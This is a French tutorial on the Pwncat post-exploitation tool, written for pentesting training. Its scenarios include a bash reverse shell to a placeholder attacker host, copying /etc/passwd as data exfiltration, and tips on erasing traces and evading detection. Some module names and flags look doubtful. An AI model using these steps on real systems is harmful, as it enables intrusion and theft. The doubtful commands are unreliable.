# Pwncat

## Pwncat - Guide Complet

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### Introduction

**Pwncat** est un outil avancé de post-exploitation conçu pour simplifier la gestion des shells interactifs, l'exploitation des privilèges, et l'exécution de tâches complexes. Il combine des fonctionnalités comme l'escalade des privilèges, le transfert de fichiers, la gestion des sessions et l'exécution de modules d'exploitation.

Pwncat est particulièrement apprécié pour son approche modulaire et sa capacité à gérer efficacement les connexions persistantes.

***

### 🚀 Étape 1 : Installation de Pwncat

***

#### Installation sur Linux

1.  **Cloner le dépôt officiel** :

    ```bash
    git clone https://github.com/calebstewart/pwncat.git
    ```
2.  **Naviguer dans le répertoire** :

    ```bash
    cd pwncat
    ```
3.  **Installer les dépendances** :

    ```bash
    pip install .
    ```
4.  **Lancer Pwncat** :

    ```bash
    pwncat --help
    ```

***

### 🛠️ Étape 2 : Lancer Pwncat

***

#### 1. Lancer Pwncat en Mode Serveur (Reverse Shell)

Si vous attendez une connexion depuis une cible compromise (reverse shell), lancez Pwncat en mode serveur pour écouter sur un port spécifique.

**Commande :**

```bash
pwncat -lp <port>
```

*   **Exemple** :

    ```bash
    pwncat -lp 4444
    ```
* **Explication** :
  * `-l` : Met Pwncat en mode écoute (listening).
  * `-p` : Spécifie le port d’écoute (4444 dans cet exemple).

***

#### 2. Lancer Pwncat en Mode Client (Bind Shell)

Si la cible a configuré un **bind shell**, vous pouvez vous y connecter en mode client.

**Commande :**

```bash
pwncat <target_ip> <port>
```

*   **Exemple** :

    ```bash
    pwncat 192.168.1.10 4444
    ```
* **Explication** :
  * `<target_ip>` : Adresse IP de la cible.
  * `<port>` : Port sur lequel la cible écoute (4444 dans cet exemple).

***

#### 3. Lancer Pwncat pour une Connexion SSH

Si la cible utilise SSH, vous pouvez établir une connexion SSH sécurisée.

**Commande :**

```bash
pwncat --ssh <username>@<target_ip> -p <port>
```

*   **Exemple** :

    ```bash
    pwncat --ssh user@192.168.1.10 -p 22
    ```
* **Explication** :
  * `--ssh` : Spécifie une connexion SSH.
  * `<username>` : Nom d’utilisateur pour la connexion.
  * `<target_ip>` : Adresse IP de la cible.
  * `<port>` : Port SSH (22 par défaut).

***

#### 4. Lancer Pwncat pour une Session Persistante

Si vous souhaitez maintenir une session persistante après l’obtention d’un shell, utilisez l’option `--persist`.

**Commande :**

```bash
pwncat --persist
```

* **Explication** :
  * `--persist` : Configure un shell persistant qui se reconnecte automatiquement si la session est interrompue.

### 🔍 Étape 3 : Fonctionnalités Principales

***

#### 1. Gestion de Réseau et de Tunnels

**a) Mettre en place un Port Forwarding**

*   **Commande** :

    ```bash
    run network.port_forward local_port=8080 remote_host=192.168.1.5 remote_port=80
    ```
* **Explication** :
  * Permet de rediriger le trafic du port local `8080` vers le port `80` de la machine distante `192.168.1.5`.

**b) Créer un Tunnel SSH**

*   **Commande** :

    ```bash
    run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080
    ```
* **Explication** :
  * Configure un tunnel SSH sécurisé entre la machine locale et l'hôte distant via le port `22`.

***

#### 2. Modules de Shell et de Commandes

**a) Lancer un Shell Interactif**

*   **Commande** :

    ```bash
    run shell.interactive
    ```
* **Explication** :
  * Ouvre un shell interactif sur la machine cible, permettant d’exécuter des commandes directement.

**b) Uploader un Fichier vers la Cible**

*   **Commande** :

    ```bash
    run shell.upload src="/path/to/local/file" dest="/tmp/remote_file"
    ```
* **Explication** :
  * Transfère un fichier local vers la machine cible.

**c) Télécharger un Fichier depuis la Cible**

*   **Commande** :

    ```bash
    run shell.download src="/tmp/remote_file" dest="/path/to/local/file"
    ```
* **Explication** :
  * Récupère un fichier de la cible vers votre machine.

***

#### 3. Gestion des Sessions

**a) Lister les Sessions Actives**

*   **Commande** :

    ```bash
    run session.list
    ```
* **Explication** :
  * Affiche toutes les sessions ouvertes avec leurs ID.

**b) Interagir avec une Session Active**

*   **Commande** :

    ```bash
    run session.interact id=1
    ```
* **Explication** :
  * Ouvre une session active avec l’ID spécifié.

**c) Terminer une Session**

*   **Commande** :

    ```bash
    run session.kill id=1
    ```
* **Explication** :
  * Termine la session active avec l’ID spécifié.

***

#### 4. Escalade des Privilèges

Pwncat inclut des modules pour automatiser l'identification des vulnérabilités permettant l'escalade des privilèges.

**a) Rechercher des Configurations Sudo Exploitables**

*   **Commande** :

    ```bash
    run escalate.sudo
    ```
* **Explication** :
  * Identifie les commandes sudo mal configurées pouvant être exploitées pour une escalade de privilèges.

**b) Rechercher des Exploits Automatiquement**

*   **Commande** :

    ```bash
    run escalate.auto
    ```
* **Explication** :
  * Lance une recherche automatique d’exploits pour escalader les privilèges.

**c) Exploiter "Dirty Sock"**

*   **Commande** :

    ```bash
    run exploit.dirty_sock
    ```
* **Explication** :
  * Exploite la vulnérabilité "Dirty Sock" présente sur certains systèmes Linux pour obtenir un accès root.

***

#### 5. Modules de Développement et Personnalisation

**a) Charger un Module Personnalisé**

*   **Commande** :

    ```bash
    run dev.custom_module path="/path/to/module.py"
    ```
* **Explication** :
  * Charge et exécute un module Python personnalisé.

**b) Activer le Mode Débogage**

*   **Commande** :

    ```bash
    run dev.debug level=verbose
    ```
* **Explication** :
  * Fournit des informations détaillées pour déboguer ou développer des modules.

***

### 📋 Scénarios d’Utilisation

***

#### Exemple 1 : Reverse Shell avec Pwncat

1.  **Configurer Pwncat en écoute sur un port** :

    ```bash
    pwncat -lp 4444
    ```
2.  **Établir la connexion depuis la cible** :

    ```bash
    bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
    ```
3.  **Obtenir un Shell Interactif sur la cible** :

    ```bash
    run shell.interactive
    ```

***

#### Exemple 2 : Uploader et Exécuter un Script de Post-Exploitation

1.  **Uploader un script LinPEAS** :

    ```bash
    run shell.upload src="/path/to/linpeas.sh" dest="/tmp/linpeas.sh"
    ```
2.  **Exécuter le script** :

    ```bash
    run shell.interactive
    bash /tmp/linpeas.sh
    ```

***

#### Exemple 3 : Persistance et Tunnels

1.  **Configurer une session persistante** :

    ```bash
    pwncat --persist
    ```
2.  **Mettre en place un tunnel SSH pour la communication** :

    ```bash
    run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080
    ```

#### Exemple 4 : Uploader un Script d'Exploitation et Maintenir une Session

1.  **Uploader un script LinPEAS** :

    ```bash
    run shell.upload src="/path/to/linpeas.sh" dest="/tmp/linpeas.sh"
    ```
2.  **Exécuter le script** :

    ```bash
    run shell.interactive
    bash /tmp/linpeas.sh
    ```
3.  **Maintenir une session persistante** :

    ```bash
    run session.list
    ```

***

#### Exemple 5 : Exploiter une Vulnérabilité Sudo

1.  **Rechercher les vulnérabilités Sudo** :

    ```bash
    run escalate.sudo
    ```
2.  **Si une vulnérabilité est détectée, lancer l’exploitation** :

    ```bash
    run exploit.sudo_vuln
    ```

***

#### Exemple 6 : Configurer un Tunnel pour Exfiltration de Données

1.  **Démarrer un tunnel SSH sécurisé** :

    ```bash
    run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080
    ```
2.  **Utiliser le tunnel pour exfiltrer des fichiers sensibles** :

    ```bash
    run shell.download src="/etc/passwd" dest="./passwd_copy"
    ```

***

### 📖 Bonnes Pratiques

***

#### 1. Obtenir des Autorisations Légales

* Toujours obtenir l’autorisation explicite avant de lancer des actions sur un système.

#### 2. Limiter les Traces

*   Supprimez les fichiers téléchargés après leur utilisation :

    ```bash
    rm /tmp/linpeas.sh
    ```

#### 3. Automatiser les Tâches Répétitives

* Utilisez des scripts personnalisés pour automatiser des actions comme l’escalade de privilèges ou le téléchargement de fichiers.

#### 4. Éviter la Détection

* Combinez Pwncat avec des outils comme `obfuscate` pour minimiser les alertes sur les systèmes surveillés.

***

### Conclusion

**Pwncat** est un outil puissant et modulaire qui simplifie la post-exploitation et la gestion des shells interactifs. Que ce soit pour l'escalade des privilèges, le transfert de fichiers ou la gestion de sessions multiples, Pwncat s'intègre parfaitement dans les workflows des pentesters.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
